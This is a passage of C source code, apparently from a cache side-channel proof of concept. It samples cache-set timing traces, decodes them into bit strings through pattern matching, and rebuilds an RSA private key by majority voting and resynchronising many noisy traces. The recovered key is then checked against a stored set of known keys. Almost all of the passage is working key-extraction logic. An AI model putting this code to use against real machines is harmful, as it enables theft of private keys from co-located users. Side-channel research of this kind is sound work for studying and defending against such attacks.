		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';
		CurrOnesIdx++;
	}

	// We may have run over all ones but still have zeroes in the bank, continue filling '?' where
	// no zeroes are found.
	while (CurrZeroIdx < ZerosFound)
	{
		LastIndex = ZerosIndexes[CurrZeroIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';
		CurrZeroIdx++;
	}

	// End of string, for printing to screen.
	ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = 0;

	if (pFoundBitsNum != NULL)
		*pFoundBitsNum = CurrOnesIdx + CurrZeroIdx + BadBitsNum;

	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;

		//fprintf(pFile, "\r\nModified:\r\n%s\r\n", Samples);
		fprintf(pFile, "Key:\r\n%s\r\n", ReadData);
		fclose(pFile);
	}
	// if looking for pattern and the difference between zeros and ones more than 10%, probably a noisy set. give score 0
/*	double diff;
	if (pScore != NULL){
		if (ZerosFound)
			diff = (double)abs(OnesFound - ZerosFound) / (double)(ZerosFound + OnesFound);
//		if (*pScore > 250 && FindPattern)
//			printf("%f\n", diff);
		if (FindPattern && diff < 0.08)
			*pScore = 0;
	}
*/
	// decrease diff precent points for difference
	double diff;
	diff = (double)(OnesFound - ZerosFound) / (double)(ZerosFound + OnesFound);
	if (diff < 0) diff = 0 - diff;		//abs value
	Score = (int)((1. - diff) * Score);
//if (pScore != NULL)
//printf("\nScore - %d, diff - %f", *pScore, diff);

	free(TmpSamples);
	free(ZerosIndexes);
	free(OnesIndexes);
	return ReadData;
}

/**
 * Takes an array of samples and rate them for each possible pattern.
 *
 * In more detail:
 * We search the samples for the OnesPattern and ZerosPattern for each possible pattern.
 * If we find them we rate give the pattern points.
 *
 * We also return the score describing how many patterns were found for the best match pattern
 * We also return the the pattern themselves.
 *
 * Returns a pointer to an allocated buffer containing the translated bits.
 */
char* LookForPatternInSet(char* Samples, char OnesPattern[], char ZerosPattern[], int PatternBitsNum, int SamplesNum, int WriteToFile, char* pFileName, int* pScore, int* pFoundBitsNum)
{
	int CurrSample = 0;
	int Score = 0;
	int bit, i;
	int WrongBits;
	int OnesFound = 0;
	int ZerosFound = 0;
	int ForwardSteps = 2;
	int Step;
//	int MaxWrongBits = 0;
	int MaxWrongBits = MAX_WRONG_ZEROS;
	int* ZerosIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int* OnesIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int CurrZero;
	FILE* pFile;
	int DataLen = SamplesNum / PatternBitsNum + 1;
	char* ReadData = malloc(DataLen);
//	char *BestOnes = malloc(sizeof(PatternBitsNum)), *BestZeros = malloc(sizeof(PatternBitsNum));
	int OnesNum = 0, ZerosNum = 0;
	char* TmpSamples = malloc(SamplesNum + 1);

//for (OnesNum = (PatternBitsNum - 1); OnesNum >= (PatternBitsNum / 2); OnesNum--){
//memset(ZerosPattern, 0, PatternBitsNum);
//for (ZerosNum = 0; ZerosNum < PatternBitsNum - 1; ZerosNum++){

	memcpy(TmpSamples, Samples, SamplesNum);
	*pScore = 0;
	// Write to file the samples before we start analyzing them.
	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;
		// If too many samples to easily read, only print the first 50k
		if (SamplesNum > 50000)
			TmpSamples[50000] = 0;

		pFile = fopen(pFileName, "wr");
		fprintf(pFile, "Samples:\r\n");
		//fprintf(pFile, "%s\r\n", TmpSamples);

		int Line = 0;
		for (Line = 0; Line < strlen(TmpSamples); Line += 100)
		{
			fprintf(pFile, "%.100s\r\n", TmpSamples + Line);
		}
	}

	memcpy(TmpSamples, Samples, SamplesNum);

	int ConsecutiveZeroes = 0;
	int Interruptions = 0;

	// For starters, make sure we do not confuse non-encryption areas with encryption areas.
	while (CurrSample < SamplesNum)
	{
		// Find groups of continous zeroes
		if (*(TmpSamples + CurrSample) == 0)
		{
			ConsecutiveZeroes++;
		}
		else if (ConsecutiveZeroes != 0)
		{
			// Enough consecutive zeroes found, annialate them!
			if (Interruptions >= 1 && ConsecutiveZeroes >= PatternBitsNum * 2)
			{
				memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
			}

			// If we have more than 1 sample interrupting the arrival of 0 bits, start counting from scratch.
			if (Interruptions > 1)
			{
				ConsecutiveZeroes = 0;
				Interruptions = 0;
			} else
			{
				Interruptions++;
			}
		}

		CurrSample++;
	}

	// Enough consecutive zeroes found, annialate them!
	if (ConsecutiveZeroes >= PatternBitsNum * 2)
	{
		memset(TmpSamples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
	}

//int OnesNum = 0, ZerosNum = 0;
//while(1){
// For each ones pattern (replace the last '1' bit to '0' in each round)
//memset(OnesPattern, 1, PatternBitsNum);
*pScore = 0;





//char TmpSamples_3[SamplesNum + 1];
//memcpy(TmpSamples_3, TmpSamples, SamplesNum);


//for (OnesNum = (PatternBitsNum - 1); OnesNum >= (PatternBitsNum / 2); OnesNum--){
//memset(ZerosPattern, 0, PatternBitsNum);
//ZerosPattern[0] = 1;
// For each zeros pattern (replace the firsy '0' bit to '1' in each round)
//for (ZerosNum = 0; ZerosNum < PatternBitsNum - 1; ZerosNum++){

//printf("before, ");
//	TmpSamples = malloc(SamplesNum + 1);
//printf("after\n");
//if (*pScore > 0){
//	char In[10];
//	scanf("%s",In);
//}
//char TmpSamples_2[SamplesNum + 1];

//printf("before\n");
//memcpy(TmpSamples_2, TmpSamples_3, SamplesNum);
//printf("after\n");

//	memset (ZerosIndexes, 0 ,sizeof(int) * SamplesNum / PatternBitsNum);
//	memset (OnesIndexes, 0 ,sizeof(int) * SamplesNum / PatternBitsNum);
//	ZerosPattern[ZerosNum] = 1;
//int Bit;
//printf("\n(");
//for (Bit = 0; Bit < PatternBitsNum; Bit++) printf("%d", ZerosPattern[Bit]);
//printf("), (");
//for (Bit = 0; Bit < PatternBitsNum; Bit++) printf("%d", OnesPattern[Bit]);
//printf(")\n\033[A");
//rate the set
	memset(ReadData, 0, DataLen);
	CurrSample = 0;
	Score = 0;
	// First we will try and find all the zeroes
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += ((*(TmpSamples + CurrSample + bit + Step) != *(ZerosPattern + bit)) ? 1 : 0);
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a zero pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xe;
			}

			ZerosIndexes[ZerosFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1;
			CurrSample += PatternBitsNum + BestStep;
//printf("%d\n\033[A",Score);
		}
		else
		{
			CurrSample++;
		}
	}

	CurrSample = 0;
	ForwardSteps = 1;
	CurrZero = 0;
	MaxWrongBits = MAX_WRONG_ONES;

	// Now do the same for ones
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		if (CurrZero < ZerosFound && CurrSample > ZerosIndexes[CurrZero])
			CurrZero++;

		if (CurrZero < ZerosFound && CurrSample == ZerosIndexes[CurrZero])
			CurrSample += PatternBitsNum;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += (*(TmpSamples + CurrSample + bit + Step) != *(OnesPattern + bit));
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a one pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(TmpSamples + CurrSample + BestStep + bit) = 0xf;
			}

			OnesIndexes[OnesFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + 1;
			CurrSample += PatternBitsNum + BestStep + 1;
//printf("%d\n\033[A",Score);
		}
		else
		{
			CurrSample++;
		}
	}
//printf("end balagan\n");

	// Set need at least 500 points per 3500 samples
//	if (Score < (SamplesNum / 3500 * 500) || Score > (SamplesNum / 3500 * 1000))
//	if ((Score) > (SamplesNum / 3) || (Score) < (SamplesNum / 7))
	if ((Score) > (SamplesNum / 4) || (Score) < (SamplesNum / 7))
		Score = 0;


	// If we found way more zeroes then ones or the other way round, this probably isn't a real key.
	// Give this set a 0 score.
//	if (OnesFound > ZerosFound * 4 ||
//		ZerosFound > OnesFound * 4)
//		Score = 0;


	// decrease diff precent points for difference
	double diff;
	if ((ZerosFound || OnesFound) && Score){
		diff = (double)(OnesFound - ZerosFound) / (double)(ZerosFound + OnesFound);
		if (diff < 0) diff = 0 - diff;		//abs value
		Score = (int) pow((double)(Score), (1. - pow(diff / 0.1, 2)));
	}
	if (diff > 0.1)
		Score = 0;



//if (Score &&  SamplesNum > 100000){
//printf("\nScore - %d, diff - %f, ", Score, diff);
//printf("%d, %d\n", OnesNum, ZerosNum);
//}


	// Only give a score if one was requested and the current score is higher than previous ones
//printf("%d, %d\n", Score, *pScore);
//	if ((*pScore < Score)){
//printf("something found!\n");
//char aa[100];
//scanf("%s",aa);
//		printf("\n\nold: %3d, new: %3d, pattern is: ", *pScore, Score);
//		int bit;
//		for (bit = 0; bit < PatternBitsNum; bit++) printf("%d", BestZeros[bit]);
//		printf(", ");
//		for (bit = 0; bit < PatternBitsNum; bit++) printf("%d", BestOnes[bit]);
//		printf(", JustTested");
//		for (bit = 0; bit < PatternBitsNum; bit++) printf("%d", OnesPattern[bit]);
//		printf(", ");
//		for (bit = 0; bit < PatternBitsNum; bit++) printf("%d", ZerosPattern[bit]);
///		printf("\n\033[3A");

		*pScore = Score;
//		memcpy(BestOnes, OnesPattern, PatternBitsNum);
//		memcpy(BestZeros, ZerosPattern, PatternBitsNum);

//	}

	int CurrOnesIdx = 0;
	int CurrZeroIdx = 0;
	int LastIndex = -1;
	int LastBitEnd = 0;
	int BadBitsNum = 0;

//	if (WriteToFile) {
//		fprintf(pFile, "Indexes:\r\n");
//		PrintInLines2(pFile, "\r\n", 100, 1);
//	}

//printf("done row\n");
//	free(TmpSamples_2);
//printf("done free\n");

//}
//printf("done row\n");
//OnesPattern[OnesNum] = 0;
//}
//}
//printf("done set\n");

	free(TmpSamples);
	free(ZerosIndexes);
	free(OnesIndexes);
//printf("done free_1\n");

//printf("%d\n\033[A\033[A\033[A",PatternBitsNum);
//	memcpy (OnesPattern, BestOnes, PatternBitsNum);
//	memcpy (ZerosPattern, BestZeros, PatternBitsNum);
//	free(BestZeros);
//	free(BestOnes);
//printf("done free_2\n");

	return ReadData;
}

int RatePatternsInSet(Cache_Set* pSet, char OnesPattern[], char ZerosPattern[], int PatternBitsNum, int SamplesNum, char *FileName, int FindPattern, int ScoreArr[PATTERN_LEN + 1][PATTERN_LEN + 1])
{
	char* Samples = PollForDataSamples(pSet, SamplesNum);
	int Score = 0;
	char* ReadData;
	if (!FindPattern){
		ReadData = SamplesToDataBitsArray(Samples, OnesPattern, ZerosPattern, PatternBitsNum, SamplesNum, 
			FileName != NULL, FileName, &Score, NULL, FindPattern);
//		ReadData = LookForPatternInSet(Samples, OnesPattern, ZerosPattern, PatternBitsNum, SamplesNum, 
//			FileName != NULL, FileName, &Score, NULL, FindPattern);
		free(ReadData);
	}
	else{
		char Ones[PatternBitsNum], Zeros[PatternBitsNum];
		int TmpScore, row, col;
		for (row = 0; row < PatternBitsNum; row++)
			Ones[row] = 1;
		Zeros[0] = 1;

		for (row = PatternBitsNum - 1; row > (PatternBitsNum / 2); row --){
			for (col = 1; col < PatternBitsNum; col++) Zeros[col] = 0;

			for (col = 1; col < (row - 1); col ++){
				Zeros[col] = 1;
				ReadData = LookForPatternInSet(Samples, Ones, Zeros, PatternBitsNum, SamplesNum, 
					FileName != NULL, FileName, &TmpScore, NULL);
				free(ReadData);
//				if (TmpScore > Score || Score == 0){
					ScoreArr[row][col] += TmpScore;
//					memcpy (ZerosPattern, Zeros, PatternBitsNum);
//					memcpy (OnesPattern, Ones, PatternBitsNum);
//for (b = 0; b < PatternBitsNum; b++) printf("%d", OnesPattern[b]);
//printf(", ");
//for (b = 0; b < PatternBitsNum; b++) printf("%d", (char) ZerosPattern[b]);
//printf("B\n");

//				}
			}//end_for_col
			Ones[row] = 0;
		}//end_for_row
	}
	free(Samples);

	return Score;
}

__always_inline char* ExtractKeyFromSet(Cache_Set* pSet, char OnesPattern[], char ZerosPattern[], int PatternBitsNum, int KeysNum, char RsaKey[KEYS_LEN_IN_BITS / 8],int *samples_found)
{
	int SamplesNum = MAX_SAMPLES_PER_BIT * KEYS_LEN_IN_BITS * NUMBER_OF_KEYS_TO_SAMPLE;
	char* Samples;
	char SampledKeys[KeysNum][KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS];
	int SampledKeysLengths[KeysNum];
	int Bit, KeyBit;
	int BitsFound;
	int CurrKey = 0;
	int KeysFound = 0;
	char* pData;
	int NumOfSamplesTaken = 0;
	int Equal;
	int NewKeys = 0;
	// Initialize SampledKeys to be only '?'
	memset(SampledKeys, '?', sizeof(SampledKeys));

	// Sample keys until we have enough to extract the real key.
	while(CurrKey < KeysNum)
	{
		// Take samples
		Samples = PollForDataSamples(pSet, SamplesNum);

		// First turn the samples into actual bits of data
		pData = SamplesToDataBitsArray(Samples, OnesPattern, ZerosPattern, PatternBitsNum, SamplesNum, 1, "KeySamplesFile.txt", NULL, &BitsFound, 0);

		// Now that we have the bits, we need to identify different keys in the data so we can compare them later.
		Bit = 0;
		while (Bit + 5 < BitsFound && CurrKey < KeysNum)
		{
			// the start of a new key will be identified by at least 3 unidentified bits, followed by 3 identified bits
			if (pData[Bit] == '?' && pData[Bit + 1] == '?' && pData[Bit + 2] == '?' &&
				pData[Bit + 3] != '?' && pData[Bit + 4] != '?' && pData[Bit + 5] != '?')
			{
				Bit += 3;

				// We found the start of a key, copy it until we run into three unidentified bits again, or we run out of space.
				for (KeyBit = 0; KeyBit < KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS; KeyBit++)
				{
					// If this is the end of the key, stop
					if (pData[Bit + KeyBit] == '?' && pData[Bit + KeyBit + 1] == '?' && pData[Bit + KeyBit + 2] == '?')
						break;

					SampledKeys[CurrKey][KeyBit] = pData[Bit + KeyBit];
				}

				Bit += KeyBit;
				// Check if we found enough bits - we don't want to deal with keys which are too short.
				if (KeyBit > (KEYS_LEN_IN_BITS - MAX_MISSING_BITS)){
					SampledKeysLengths[CurrKey] = KeyBit;
					CurrKey++;
					NewKeys++;

				}
				else{
					//=============================Y&N : We might want to delete this line to check even shorts keys
					memset(SampledKeys[CurrKey], '?', KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS);
				}
			}
			else
			{
				Bit++;
			}
		}
		printf("                                     \r"
			   "%d out of %d traces were gathered\r\n\033[1A", CurrKey, KeysNum);
		NumOfSamplesTaken++;
		free(Samples);
		free(pData);

		// If we found too little keys, this set might not be good enough, just give up on it.
		if ((NewKeys < (NUMBER_OF_KEYS_TO_SAMPLE / 10)) && (CurrKey < (NUMBER_OF_KEYS_TO_SAMPLE / 10)))
			break;

		NewKeys = 0;
	}
	printf("\r\n");

	*samples_found = CurrKey;
	// Make sure we found at least half the keys we were looking for.
	if (CurrKey < KeysNum / 2)
		return NULL;
	
	if (DEMO){
		int row;
		int keyNumber, bitsToPrint = 75, KeyToPrintNumber = 1, first = 0;
		char KeysToPrint[5][KEYS_LEN_IN_BITS];
		while (KeyToPrintNumber != 5 && first < CurrKey){
			if(SampledKeysLengths[first] < 3500)
				continue;
			memcpy(KeysToPrint[0], SampledKeys[first], KEYS_LEN_IN_BITS);
			for (keyNumber = 0; keyNumber < CurrKey && KeyToPrintNumber < 5; keyNumber++){
				int eq = memcmp(KeysToPrint[0], SampledKeys[keyNumber], 15);
				if (eq ==0 && SampledKeysLengths[keyNumber] > 3500){
					memcpy(KeysToPrint[KeyToPrintNumber], SampledKeys[keyNumber], KEYS_LEN_IN_BITS);
					KeyToPrintNumber++;
				}
			}
			first++;
		}
		for(keyNumber = 0; keyNumber < KeyToPrintNumber; keyNumber++){
			printf("%.*s......%.*s\n", bitsToPrint / 2, KeysToPrint[keyNumber], bitsToPrint / 2, KeysToPrint[keyNumber] + bitsToPrint);
			usleep(500000);
		}
	}


	// Ok we parsed all the keys, now lets do some statistics on it to find the real key.
	char *pRealKeyBits = malloc(KEYS_LEN_IN_BITS);
	char TmpKeyChunk[BITS_IN_CHUNK];
	char *pRealKey = malloc(KEYS_LEN_IN_BITS / BITS_IN_CHAR);
	memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);
	memset(pRealKeyBits, 0, KEYS_LEN_IN_BITS);
	KeysFound = CurrKey;
	int ValidKeys = KeysFound;

	// Debug variables for breakpoints.
	int dbgContinue = 0; //(KeysFound == KeysNum);
	int SkippedBitAverage = 0;
	int FinalSkippedBitAverage = 0;
	// This loop is just to allow debugging this algorithm over and over if dbgContinue == 1.
	do {
		int KeySkipIndex[KeysNum];				// This array tells us at what offset are the keys currently synced.
		int AreKeysUnsynched[KeysNum];
		memset(KeySkipIndex, 0, sizeof(KeySkipIndex));
		memset(AreKeysUnsynched, 0, sizeof(AreKeysUnsynched));
		int BitChunks, ByteInKey, BitInChunk;

		int SkippedBitCount = 0;

		// Lets start by syncing the beggining of the keys
		for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
		{
			// Skip all 0 bits at start of key and sync them on the first 1 bit.
			while (SampledKeys[CurrKey][KeySkipIndex[CurrKey]] != '1' &&
					KeySkipIndex[CurrKey] < SampledKeysLengths[CurrKey] &&
					SampledKeysLengths[CurrKey] >= (KEYS_LEN_IN_BITS - MAX_MISSING_BITS))
			{
				// This array tells us at what offset are the keys currently synced.
				KeySkipIndex[CurrKey]++;
			}

			// Count how many 0 bits we skipped, we will add them back later.
			SkippedBitCount += KeySkipIndex[CurrKey];
		}
		//successBitRatio(SampledKeys,KeysNum,KeySkipIndex,RsaKey,1);
		// Calculate how many bits on average we skipped so we can add them later.
		SkippedBitAverage = SkippedBitCount / KeysFound;

		// Round the number.
		SkippedBitAverage += ((((float)SkippedBitCount) / KeysFound) - (float)SkippedBitAverage > 0.5);

		/**
		 * We now go over the sampled keys, chunk by chunk, and decide on the bits of the real key.
		 */
		for (BitChunks = 0; BitChunks < KEYS_LEN_IN_BITS / BITS_IN_CHUNK; BitChunks++)
		{
			int BitExtractionAttempts;
			memset(TmpKeyChunk, 0, sizeof(TmpKeyChunk));

			// In this loop we extract the current chunk of the key, then re-align any sampled key
			// that lost syncronization with the rest.
			//
			// We do this twice, I.E. once we figured out the chunk and re-aligned the sampled keys,
			// we re-calculate the chunk to get a more accurate prediction of the key.
			for (BitExtractionAttempts = 0; BitExtractionAttempts < 2; BitExtractionAttempts++)
			{
				// Go over each bit in the chunk, and do a majority vote on what it should be.
				for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK; BitInChunk++)
				{
					int OnesAndZeroesBalance = 0;
					KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;			//chunk offset + bit in chunk
					ByteInKey = BitChunks * (BITS_IN_CHUNK / BITS_IN_CHAR);

					// Go over all the bits in the same index and check if there are more 0's or 1's
					for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
					{
						// Ignore sampled keys that have lost sync or have illegal bits.
						if (SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] == '?' ||
							AreKeysUnsynched[CurrKey])
						{
							continue;
						}

						OnesAndZeroesBalance += ((SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] == '1') ? 1 : -1);
					}

					TmpKeyChunk[BitInChunk] = (OnesAndZeroesBalance > 0) + '0';

					// If there was no clear winner, mark it as an unknown bit.
					if (( OnesAndZeroesBalance > -2 && OnesAndZeroesBalance < 2))
						TmpKeyChunk[BitInChunk] = '?';
				}

				// Copy the key chunk into the real key.
				memcpy(pRealKeyBits + (BitChunks * BITS_IN_CHUNK), TmpKeyChunk, sizeof(TmpKeyChunk));

				// We have determined the first byte, now find out which keys failed to match and why.
				// Go over all the bits in the same index and check if there are more 0's or 1's
				for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
				{
					int WrongBits = 0;

					// Ignore keys which are too short
					if (SampledKeysLengths[CurrKey] < (KEYS_LEN_IN_BITS - MAX_MISSING_BITS))
						continue;

					// Check how many bits are bad for this key.
					for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK; BitInChunk++)
					{
						KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;
						WrongBits += (SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] != pRealKeyBits[KeyBit]);
					}

					// If there is only one or 2 mistakes, it could be a switched bit, ignore it.
					if (WrongBits > MAX_WRONG_BITS_IN_CHUNK)
					{
						int BitShift = 0;
						int InsertedBit = 0;
						int BestResult = 10;
						int BestShift = 0;

						// If we are in the first byte, cannot shift backwards.
						if (ByteInKey == 0)
							BitShift = 0;

						// Try and see if there would be less mistakes if we shift a few bits backwards or forwards
						while (WrongBits >= 3 && BitShift <= 3 && BitShift >= -3)
						{
							// First thing first, try seeing if inserting a bit in any one position solves the problem.
							for (InsertedBit = 0; InsertedBit < BITS_IN_CHUNK - (MAX_WRONG_BITS_IN_CHUNK + 1); InsertedBit++)
							{
								int fSkippedBit = 0;
								WrongBits = 0;

								// We assume there is a new bit in InsertedBit position, and check if the problem get fixed.
								for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK - 1; BitInChunk++)
								{
									// If we get to the inserted bit position, skip it.
									if (BitInChunk == InsertedBit)
										fSkippedBit = 1;

									KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;
									WrongBits += (SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey] + BitShift] != pRealKeyBits[KeyBit + fSkippedBit]);
								}

								// If the problems were solved, update the shift counters
								if (WrongBits <= 1 && WrongBits <= BestResult)
								{
									BestResult = WrongBits;
									BestShift = BitShift - (InsertedBit < BITS_IN_CHUNK);

									if (BestResult == 0)
										break;
								}
							}

							// If the problems were solved, update the shift counters
							if (BestResult == 0)
								break;

							// We start from bitShift == 0, go up to 3, then -1 to -3.
							if (BitShift >= 0 && BitShift < 3)
								BitShift++;
							else if (BitShift == 3)
								BitShift = -1;
							else
								BitShift--;
						}

						// If problems still there, mark key so its not counted in vote next time.
						if (BestResult <= MAX_WRONG_BITS_IN_CHUNK)
						{
							KeySkipIndex[CurrKey] += BestShift;
							ValidKeys += (AreKeysUnsynched[CurrKey] == 1);
							AreKeysUnsynched[CurrKey] = 0;
						} else {
							ValidKeys -= (AreKeysUnsynched[CurrKey] == 0);
							AreKeysUnsynched[CurrKey] = 1;
						}
					}
				}
			}
		}
		
		//successBitRatio(SampledKeys,KeysNum,KeySkipIndex,RsaKey,0);
		// Now print the found key
		printf("First possible key:\r\n0x");

		// We always miss the first 1 bit and any zeroes before it.
		// So check how many bits are we missing and padd with zeroes and 1's instead
		int MissingBits = 0;
		for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
		{
			if (pRealKeyBits[KEYS_LEN_IN_BITS - Bit - 1] == '?')
			{
				MissingBits++;
			}
			else
			{
				break;
			}
		}

		// Save some space for the zero bits we skipped at the start.
		FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage) ? SkippedBitAverage : MissingBits);
		int BitsPadding = (MissingBits - FinalSkippedBitAverage - 1) >= 0 ? (MissingBits - FinalSkippedBitAverage - 1) : 0;
		pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (0b1 << (BITS_IN_CHAR - 1 - (BitsPadding % BITS_IN_CHAR)));

		for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
		{
			pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
		}

		// Now compare it to the real key.
		int i, j;

		// Here we compare the key we found with the actual key.
		// There is some legacy code here that checks with the top bit on and off... I don't think this adds
		// anything anymore, but why fix what ain't broke.
		//
		// We do this 4 times, reason being that we need to padd with a single 1 bit and a bunch of 0's,
		// but we aren't sure in which order.
		// For that reason we try 4 different combinations that are likely to happen.
		// Usually this is enough.
		for (j = 0;j < 2;j++){
			pRealKey[0] ^= 0x80;
			for (i = 0; i < NUMBER_OF_DIFFERENT_KEYS; i++){
				Equal = memcmp_dbg(pRealKey, RsaKeys[i], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
				if (Equal == 0)
					break;
			}
			if (Equal == 0)
				break;
		}
		/*
		for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
		{
			printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
		}

		printf("\r\n");
		*/
		
		if (Equal != 0)
		{
			//printf("The key is WRONG!\r\n");

			//printf("Second possible key:\r\n0x");
			memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

			FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage - 1) ? SkippedBitAverage - 1 : MissingBits);
			BitsPadding = (MissingBits - FinalSkippedBitAverage - 1) >= 0 ? (MissingBits - FinalSkippedBitAverage - 1) : 0;
			pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (0b1 << (BITS_IN_CHAR - 1 - (BitsPadding % BITS_IN_CHAR)));

			for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
			{
				pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
			}


			for (j = 0;j < 2;j++){
				pRealKey[0] ^= 0x80;
				for (i = 0; i < NUMBER_OF_DIFFERENT_KEYS; i++){
					Equal = memcmp_dbg(pRealKey, RsaKeys[i], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
					if (Equal == 0)
						break;
				}
				if (Equal == 0)
					break;
			}
			/*
			for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
			{
				printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
			}
			printf("\r\n");
			*/
		}

		if (Equal != 0)
		{
			//printf("The key is WRONG!\r\n");

			//printf("Third possible key:\r\n0x");
			memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);
			MissingBits++;

			FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage) ? SkippedBitAverage : MissingBits);
			BitsPadding = (MissingBits - FinalSkippedBitAverage - 1) >= 0 ? (MissingBits - FinalSkippedBitAverage - 1) : 0;
			pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (0b1 << (BITS_IN_CHAR - 1 - (BitsPadding % BITS_IN_CHAR)));

			for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
			{
				pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
			}

			for (j = 0;j < 2;j++){
				pRealKey[0] ^= 0x80;
				for (i = 0; i < NUMBER_OF_DIFFERENT_KEYS; i++){
					Equal = memcmp_dbg(pRealKey, RsaKeys[i], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
					if (Equal == 0)
						break;
				}
				if (Equal == 0)
					break;
			}

			/*
			for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
			{
				printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
			}
			printf("\r\n");
			*/
		}

		if (Equal != 0)
		{
			//printf("The key is WRONG!\r\n");

			//printf("Fourth possible key:\r\n0x");
			memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

			FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage - 1) ? SkippedBitAverage - 1 : MissingBits);
